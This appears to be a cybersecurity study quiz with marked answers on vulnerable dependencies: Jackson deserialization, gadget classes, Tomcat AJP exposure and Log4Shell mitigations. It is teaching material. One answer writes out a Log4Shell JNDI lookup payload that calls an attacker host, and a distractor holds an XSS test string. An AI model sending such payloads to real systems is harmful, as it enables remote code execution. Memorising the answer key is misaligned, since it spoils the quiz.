#CyberSecurity/VulnerableDependencies

### 1 . How can an attacker exploit the Jackson Databind vulnerability?
- ❌ By injecting SQL queries into the serialized JSON
- ❌ By exploiting weak encryption in the JSON keys
- ❌ By passing a URL that bypasses authentication checks
- ✅ By sending a JSON payload containing dangerous `@type` metadata

### 2. How can the risk associated with AJP be mitigated?
- ✅ Restricting AJP traffic to trusted hosts and setting a secret
- ❌ Upgrading to the latest version of Java
- ❌ Using a different logging library
- ❌ Disabling HTTPS and using HTTP only

### 3. What caused the Jackson Databind deserialization vulnerability?
- ✅ A flaw in the handling of polymorphic types
- ❌ The absence of any type handling logic
- ❌ The use of outdated cryptographic algorithms
- ❌ Insufficient logging mechanisms

### 4. What configuration change can help prevent Log4Shell attacks?
- ✅ Setting `log4j2.formatMsgNoLookups=true`
- ❌ Disabling log rotation in Log4j
- ❌ Increasing the logging level to DEBUG
- ❌ Using a firewall to block all incoming traffic

### 5. What is a gadget class in the context of deserialization vulnerabilities?
- ❌ A class that logs all serialization and deserialization events
- ✅ A class that can be exploited during deserialization to perform unintended actions
- ❌ A class that implements only the `Serializable` interface without methods
- ❌ A utility class that simplifies JSON handling

### 6. What is one major security risk of exposing an AJP connector to the internet?
- ✅ It can lead to remote code execution through deserialization exploits.
- ❌ It can allow attackers to perform DNS cache poisoning.
- ❌ It makes the application vulnerable to Cross-Site Scripting (XSS).
- ❌ It causes encryption keys to be logged in plain text.

### 7. What is the primary mitigation for the Jackson deserialization vulnerability?
- ❌ Switching to XML instead of JSON
- ✅ Upgrading to a patched version of Jackson and whitelisting allowed types
- ❌ Disabling all JSON handling in the application
- ❌ Using prepared statements for database queries

### 8. What made the Log4Shell vulnerability (CVE-2021-44228) possible?
- ❌ A lack of secure password storage in Log4j
- ❌ Improper token validation in Log4j
- ✅ A remote code execution flaw in the JNDI lookup feature
- ❌ Unpatched vulnerabilities in the LDAP server

### 9. What role does the AJP connector play in a Tomcat-based application?
- ❌ It acts as a database connection pool manager.
- ✅It serves as a bridge between a web server and Tomcat for request forwarding.
- ❌ It is responsible for TLS encryption of all HTTP requests.
- ❌ It handles file uploads from the client.

### 10. What type of action might a gadget class perform when deserialized?
- ✅ Write files or execute code without explicit calls from the application
- ❌ Automatically compress large objects in memory
- ❌ Send email alerts to the system administrator
- ❌ Automatically hash all fields using SHA-256

### 11. Which input could trigger the Log4Shell vulnerability?
- ✅  `${jndi:ldap://malicious-server.com/a}`
- ❌  `<script>alert('XSS')</script>`
- ❌ `GET /login HTTP/1.1`
- ❌ `{ "username": "admin", "password": "password123" }`

### 12. Why are gadget classes often found in common libraries?
- ❌ Common libraries are more likely to be open source and freely available.
- ✅ Common libraries often include reusable classes with methods that may be automatically invoked during deserialization.
- ❌ Common libraries are written in older programming languages.
- ❌ Common libraries are more frequently updated and include additional features.